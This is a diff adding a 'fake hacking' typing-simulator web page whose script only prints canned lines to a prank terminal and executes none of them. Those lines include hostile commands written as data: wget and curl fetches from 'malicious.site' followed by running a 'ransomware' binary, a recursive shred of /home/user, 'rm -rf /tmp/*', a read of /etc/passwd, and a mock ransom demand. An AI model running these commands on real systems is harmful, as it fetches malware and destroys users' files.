@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>HackingType Pro Ultimate</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      font-family: 'Share Tech Mono', monospace;
+      background-color: #0a0c14;
+      color: #00ff00;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+    header {
+      background-color: #001100;
+      padding: 1rem 2rem;
+      border-bottom: 2px solid #00ff00;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      user-select: none;
+    }
+    header h1 {
+      font-size: 1.75rem;
+      font-weight: 900;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color: #00ff00;
+      margin: 0;
+    }
+    header span {
+      font-size: 1rem;
+      font-style: italic;
+      color: #009900;
+    }
+    main#terminal {
+      flex-grow: 1;
+      background-color: #0a0c14;
+      padding: 1.5rem 2rem;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      line-height: 1.5;
+      border-left: 4px solid #00ff00;
+      border-right: 4px solid #00ff00;
+      box-shadow: inset 0 0 20px #003300;
+      font-size: 1.1rem;
+      outline: none;
+      user-select: none;
+      position: relative;
+    }
+    .cursor {
+      display: inline-block;
+      width: 12px;
+      height: 1.2em;
+      background-color: #00ff00;
+      animation: blink 1s step-start 0s infinite;
+      margin-left: 3px;
+      border-radius: 3px;
+      box-shadow: 0 0 10px #00ff00;
+      vertical-align: bottom;
+    }
+    @keyframes blink {
+      50% { background-color: transparent; box-shadow: none; }
+    }
+    section#controlBar {
+      background-color: #001100;
+      padding: 0.75rem 2rem;
+      border-top: 2px solid #00ff00;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      user-select: none;
+      flex-wrap: wrap;
+    }
+    section#controlBar label {
+      color: #00ff00;
+      font-size: 0.9rem;
+      letter-spacing: 0.1em;
+      white-space: nowrap;
+    }
+    #speedRange {
+      flex-grow: 1;
+      min-width: 150px;
+      cursor: pointer;
+      accent-color: #00ff00;
+    }
+    #speedValue {
+      width: 3.5rem;
+      text-align: right;
+      font-variant-numeric: tabular-nums;
+      color: #00ff00;
+      font-weight: 700;
+      font-size: 1rem;
+    }
+    #scriptIndex {
+      background-color: #0a0c14;
+      border: 1px solid #00ff00;
+      color: #00ff00;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 1rem;
+      padding: 0.25rem 0.5rem;
+      border-radius: 0.375rem;
+      cursor: pointer;
+      min-width: 200px;
+      user-select: none;
+    }
+    button.controlBtn {
+      background: transparent;
+      border: 1px solid #00ff00;
+      color: #00ff00;
+      padding: 0.3rem 0.9rem;
+      border-radius: 0.375rem;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background-color 0.3s ease, color 0.3s ease;
+      user-select: none;
+    }
+    button.controlBtn:hover,
+    button.controlBtn:focus {
+      background-color: #00ff00;
+      color: #000;
+      outline: none;
+    }
+    /* Modal styles */
+    #modalOverlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.9);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      padding: 1rem;
+    }
+    #modalContent {
+      background: #0a0c14;
+      border: 3px solid #00ff00;
+      border-radius: 0.75rem;
+      max-width: 450px;
+      width: 100%;
+      padding: 2rem;
+      color: #00ff00;
+      font-size: 1.1rem;
+      line-height: 1.6;
+      box-shadow: 0 0 30px #00ff00;
+      position: relative;
+      user-select: text;
+    }
+    #modalContent h2 {
+      margin-top: 0;
+      font-size: 1.5rem;
+      font-weight: 900;
+      text-transform: uppercase;
+      letter-spacing: 0.15em;
+      margin-bottom: 1.5rem;
+      text-align: center;
+    }
+    #modalContent button.closeBtn {
+      position: absolute;
+      top: 0.5rem;
+      right: 0.5rem;
+      background: transparent;
+      border: none;
+      color: #00ff00;
+      font-size: 2rem;
+      cursor: pointer;
+      transition: color 0.3s ease;
+    }
+    #modalContent button.closeBtn:hover,
+    #modalContent button.closeBtn:focus {
+      color: #009900;
+      outline: none;
+    }
+  </style>
+</head>
+<body>
+  <header role="banner">
+    <h1>HackingType Pro Ultimate</h1>
+    <span>Simulated hacking experience</span>
+  </header>
+  <main id="terminal" aria-label="Fake hacking terminal" role="textbox" tabindex="0"></main>
+  <section id="controlBar" aria-label="Controls">
+    <label for="speedRange">Typing Speed:</label>
+    <input type="range" id="speedRange" min="5" max="100" value="20" />
+    <span id="speedValue">20</span>
+    <label for="scriptIndex">Script Index:</label>
+    <select id="scriptIndex" aria-label="Select script section">
+      <option value="all">All</option>
+      <option value="network">Network</option>
+      <option value="system">System</option>
+      <option value="exploit">Exploit</option>
+      <option value="ransomware">Ransomware</option>
+      <option value="misc">Miscellaneous</option>
+    </select>
+    <button id="helpBtn" class="controlBtn" aria-haspopup="dialog" aria-controls="helpModal">Help</button>
+    <button id="creditsBtn" class="controlBtn" aria-haspopup="dialog" aria-controls="creditsModal">Credits</button>
+  </section>
+
+  <div id="modalOverlay" role="dialog" aria-modal="true" aria-hidden="true">
+    <div id="modalContent">
+      <button class="closeBtn" aria-label="Close modal">&times;</button>
+      <div id="modalBody"></div>
+    </div>
+  </div>
+
+  <script>
+    const terminal = document.getElementById('terminal');
+    const cursor = document.createElement('span');
+    cursor.classList.add('cursor');
+    terminal.appendChild(cursor);
+
+    const speedRange = document.getElementById('speedRange');
+    const speedValue = document.getElementById('speedValue');
+    const scriptIndex = document.getElementById('scriptIndex');
+    const helpBtn = document.getElementById('helpBtn');
+    const creditsBtn = document.getElementById('creditsBtn');
+    const modalOverlay = document.getElementById('modalOverlay');
+    const modalContent = document.getElementById('modalContent');
+    const modalBody = document.getElementById('modalBody');
+    const closeBtn = modalContent.querySelector('.closeBtn');
+
+    // Large array of hacking lines categorized by type
+    const hackScripts = {
+      all: [],
+      network: [
+        "ping -c 4 192.168.1.1",
+        "nmap -sS 192.168.1.0/24",
+        "ssh root@192.168.1.1",
+        "curl http://malicious.site/payload",
+        "wget http://malicious.site/payload",
+        "netstat -anp",
+        "iptables -L",
+        "traceroute 8.8.8.8",
+        "dig example.com",
+        "tcpdump -i eth0",
+        "arp -a",
+        "ifconfig eth0 up",
+        "route add default gw 192.168.1.1",
+        "nslookup example.com",
+        "host example.com",
+        "ssh-keygen -t rsa",
+        "ssh-copy-id user@host",
+        "scp file.txt user@host:/tmp/",
+        "telnet 192.168.1.1 23",
+        "ftp ftp.example.com"
+      ],
+      system: [
+        "cat /etc/passwd",
+        "tail -f /var/log/auth.log",
+        "dmesg | tail",
+        "ps aux | grep root",
+        "top -b -n1",
+        "free -m",
+        "df -h",
+        "mount",
+        "lsmod",
+        "uname -a",
+        "uptime",
+        "whoami",
+        "id",
+        "last",
+        "journalctl -xe",
+        "systemctl status sshd",
+        "chkconfig --list",
+        "service --status-all",
+        "lsof -i",
+        "strace -p 1234"
+      ],
+      exploit: [
+        "void exploit() {",
+        "    char buffer[256];",
+        "    gets(buffer);",
+        "    printf(\"Buffer overflow!\\n\");",
+        "}",
+        "int main() {",
+        "    printf(\"Exploit started...\\n\");",
+        "    system(\"./payload\");",
+        "    return 0;",
+        "}",
+        "gcc -o exploit exploit.c -fno-stack-protector -z execstack",
+        "objdump -d exploit",
+        "gdb ./exploit",
+        "ropchain = [addr1, addr2, addr3]",
+        "payload = b'A' * 512 + ropchain",
+        "send(payload)",
+        "recv(1024)",
+        "shellcode = b\"\\x90\" * 100 + b\"\\xcc\" * 10",
+        "memcpy(buffer, shellcode, len(shellcode))"
+      ],
+      ransomware: [
+        "echo \"Encrypting files...\"",
+        "rm -rf /tmp/*",
+        "openssl enc -aes-256-cbc -salt -in file.txt -out file.txt.enc -k password",
+        "find /home/user -type f -exec shred -u {} \\;",
+        "echo \"Ransomware deployed.\"",
+        "echo \"Your files have been encrypted.\"",
+        "echo \"Send 10 BTC to address 1A2b3C4d5E6f7G8h9I0j\"",
+        "wget http://malicious.site/ransomware",
+        "chmod +x ransomware",
+        "./ransomware &"
+      ],
+      misc: [
+        "# Starting brute force attack...",
+        "# Password found: hunter2",
+        "# Connecting to remote server...",
+        "# Uploading payload...",
+        "# Exploit successful!",
+        "# Cleaning up traces...",
+        "# System compromised.",
+        "# Initiating data exfiltration...",
+        "# Waiting for command and control...",
+        "# Hack complete.",
+        "echo \"Access granted.\"",
+        "echo \"Access denied.\"",
+        "echo \"System rebooting...\"",
+        "echo \"Firewall disabled.\"",
+        "echo \"Rootkit installed.\"",
+        "echo \"Backdoor opened.\"",
+        "echo \"Logs erased.\"",
+        "echo \"Data exfiltration in progress...\"",
+        "echo \"Scanning ports...\"",
+        "echo \"Spoofing IP address...\""
+      ]
+    };
+
+    // Combine all categories for 'all'
+    hackScripts.all = [].concat(
+      hackScripts.network,
+      hackScripts.system,
+      hackScripts.exploit,
+      hackScripts.ransomware,
+      hackScripts.misc
+    );
+
+    let currentScript = 'all';
+    let lineIndex = 0;
+    let charIndex = 0;
+    let typingInterval = null;
+    let typingSpeed = 20;
+
+    function typeChar() {
+      const lines = hackScripts[currentScript];
+      if (lineIndex >= lines.length) {
+        lineIndex = 0;
+      }
+      const line = lines[lineIndex];
+      if (charIndex >= line.length) {
+        terminal.insertBefore(document.createElement('br'), cursor);
+        lineIndex = Math.floor(Math.random() * lines.length);
+        charIndex = 0;
+        return;
+      }
+      const char = line.charAt(charIndex);
+      terminal.insertBefore(document.createTextNode(char), cursor);
+      charIndex++;
+      terminal.scrollTop = terminal.scrollHeight;
+    }
+
+    function startTyping() {
+      if (typingInterval) return;
+      typingInterval = setInterval(typeChar, typingSpeed);
+    }
+
+    function stopTyping() {
+      if (typingInterval) {
+        clearInterval(typingInterval);
+        typingInterval = null;
+      }
+    }
+
+    speedRange.addEventListener('input', (e) => {
+      typingSpeed = parseInt(e.target.value, 10);
+      speedValue.textContent = typingSpeed;
+      if (typingInterval) {
+        clearInterval(typingInterval);
+        typingInterval = setInterval(typeChar, typingSpeed);
+      }
+    });
+
+    scriptIndex.addEventListener('change', (e) => {
+      currentScript = e.target.value;
+      lineIndex = 0;
+      charIndex = 0;
+      terminal.innerHTML = '';
+      terminal.appendChild(cursor);
+    });
+
+    window.addEventListener('keydown', (e) => {
+      if (e.ctrlKey && e.key === 'Enter') {
+        terminal.innerHTML = '<span>Access granted.</span><br>';
+        terminal.appendChild(cursor);
+        charIndex = 0;
+        stopTyping();
+        e.preventDefault();
+        return;
+      }
+      if (e.altKey && e.key === 'Enter') {
+        terminal.innerHTML = '<span>Access denied.</span><br>';
+        terminal.appendChild(cursor);
+        charIndex = 0;
+        stopTyping();
+        e.preventDefault();
+        return;
+      }
+      startTyping();
+    });
+
+    window.addEventListener('keyup', () => {
+      stopTyping();
+    });
+
+    helpBtn.addEventListener('click', () => {
+      showModal(
+        "Fake Hack Website Usage",
+        "<ul>" +
+        "<li>Press any key to start typing fake hacking code.</li>" +
+        "<li>Use the slider to adjust typing speed.</li>" +
+        "<li>Select script section from the dropdown to filter hacking messages.</li>" +
+        "<li>Press Ctrl + Enter to display 'Access granted' message.</li>" +
+        "<li>Press Alt + Enter to display 'Access denied' message.</li>" +
+        "</ul>"
+      );
+    });
+
+    creditsBtn.addEventListener('click', () => {
+      showModal(
+        "Credits",
+        "<ul>" +
+        "<li>Discord username: officer99912</li>" +
+        "<li>Roblox usernames: TystonZ | abiyu_indonesia02</li>" +
+        "<li>Made by unknownable</li>" +
+        "</ul>"
+      );
+    });
+
+    closeBtn.addEventListener('click', () => {
+      hideModal();
+    });
+
+    modalOverlay.addEventListener('click', (e) => {
+      if (e.target === modalOverlay) {
+        hideModal();
+      }
+    });
+
+    function showModal(title, htmlContent) {
+      modalContent.querySelector('h2')?.remove();
+      const titleElem = document.createElement('h2');
+      titleElem.textContent = title;
+      modalContent.insertBefore(titleElem, modalBody);
+      modalBody.innerHTML = htmlContent;
+      modalOverlay.style.display = 'flex';
+      modalOverlay.setAttribute('aria-hidden', 'false');
+      modalContent.querySelector('.closeBtn').focus();
+    }
+
+    function hideModal() {
+      modalOverlay.style.display = 'none';
+      modalOverlay.setAttribute('aria-hidden', 'true');
+      terminal.focus();
+    }
+
+    // Focus terminal on load for accessibility
+    window.onload = () => {
+      terminal.focus();
+    };
+  </script>
+</body>
+</html>
